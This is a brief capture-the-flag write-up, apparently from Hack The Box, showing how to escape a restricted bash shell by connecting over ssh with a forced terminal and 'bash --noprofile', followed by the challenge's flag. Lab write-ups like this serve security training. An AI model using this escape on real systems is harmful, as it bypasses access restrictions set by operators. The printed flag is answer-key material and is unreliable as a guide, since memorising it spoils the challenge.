# Connecion
Connection must be established with ssh.

# Challenge
The server is runing rbash (restricted bash)

# Solution
Connect to the server using the --noprofile parameter. `ssh restricted@178.128.42.97 -p 32390 -t "bash --noprofile"`. https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

From man documentation:
```
     -t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs 		on a remote machine, which can be very use‐
             ful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty.
```

From bash documentation:
```
--noprofile
              Do  not  read either the system-wide startup file /etc/profile or any of the personal initialization files ~/.bash_profile, ~/.bash_login,
              or ~/.profile.  By default, bash reads these files when it is invoked as a login shell (see INVOCATION below).
```

# Flag 
`HTB{r35tr1ct10n5_4r3_p0w3r1355}`